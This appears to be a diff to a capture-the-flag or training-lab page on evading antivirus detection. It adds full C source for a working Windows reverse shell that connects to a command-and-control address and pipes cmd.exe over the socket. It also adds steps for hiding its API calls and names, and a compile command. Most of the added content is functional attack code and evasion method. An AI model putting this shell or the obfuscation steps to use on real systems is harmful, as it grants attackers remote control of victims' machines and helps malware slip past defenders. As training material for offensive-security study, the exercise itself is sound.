@@ -1,6 +1,71 @@
-# Challenge
+# Real world challenge
 
-Modify the provided binary to meet the specifications below:
+No one method will be 100% effective or reliable. To create a more effective and reliable methodology, combine 
+the methods.
+
+* When determining in what order to begin obfuscation, consider the impact of each method. For example, is it easier 
+to obfuscate an already broken class or is it easier to break a class that is obfuscated?
+* In general, run automated obfuscation or less specific obfuscation methods after specific signature breaking.
+
+## Lab
+
+```text
+#include <winsock2.h>
+#include <windows.h>
+#include <ws2tcpip.h>
+#include <stdio.h>
+
+#define DEFAULT_BUFLEN 1024
+
+void RunShell(char* C2Server, int C2Port) {
+        SOCKET mySocket;
+        struct sockaddr_in addr;
+        WSADATA version;
+        WSAStartup(MAKEWORD(2,2), &version);
+        mySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
+        addr.sin_family = AF_INET;
+
+        addr.sin_addr.s_addr = inet_addr(C2Server);
+        addr.sin_port = htons(C2Port);
+
+        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
+            closesocket(mySocket);
+            WSACleanup();
+        } else {
+            printf("Connected to %s:%d\\n", C2Server, C2Port);
+
+            char Process[] = "cmd.exe";
+            STARTUPINFO sinfo;
+            PROCESS_INFORMATION pinfo;
+            memset(&sinfo, 0, sizeof(sinfo));
+            sinfo.cb = sizeof(sinfo);
+            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
+            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+
+            printf("Process Created %lu\\n", pinfo.dwProcessId);
+
+            WaitForSingleObject(pinfo.hProcess, INFINITE);
+            CloseHandle(pinfo.hProcess);
+            CloseHandle(pinfo.hThread);
+        }
+}
+
+int main(int argc, char **argv) {
+    if (argc == 3) {
+        int port  = atoi(argv[2]);
+        RunShell(argv[1], port);
+    }
+    else {
+        char host[] = "10.10.10.10";
+        int port = 53;
+        RunShell(host, port);
+    }
+    return 0;
+} 
+```
+
+Modify the binary to meet these specifications:
 
 * No suspicious library calls present
 * No leaked function or variable names
@@ -10,15 +75,17 @@ Modify the provided binary to meet the specifications below:
 It is also essential to change the C2Server and C2Port variables in the provided payload or this challenge will not 
 properly work, and you will not receive a shell back. 
 
-## Lab it up
+## Obfuscation order
 
 * Rewrite `int WSAAPI WSAConnect` to meet the requirements of a structure definition.
   * Import the `LoadLibraryW` library the calls are stored in.
   * Obtain the pointer to the address.
   * Change all occurrences of the API call with the new pointer.
 * Define all pointer addresses needed, corresponding to the structures.
-* The structure definitions should be outside any function at the beginning of the code. 
-* The pointer definitions should be at the top of the `RunShell` function
+* The structure definitions outside any function at the beginning of the code. 
+* The pointer definitions at the top of the `RunShell` function
+
+## Obfuscated code
 
 ```text
 #include <winsock2.h>
@@ -100,3 +167,5 @@ int main(int argc, char **argv) {
 Compile the binary using `mingw-gcc`.
 
     x86_64-w64-mingw32-gcc challenge.c -o challenge.exe -lwsock32 -lws2_32 
+
+And flag!
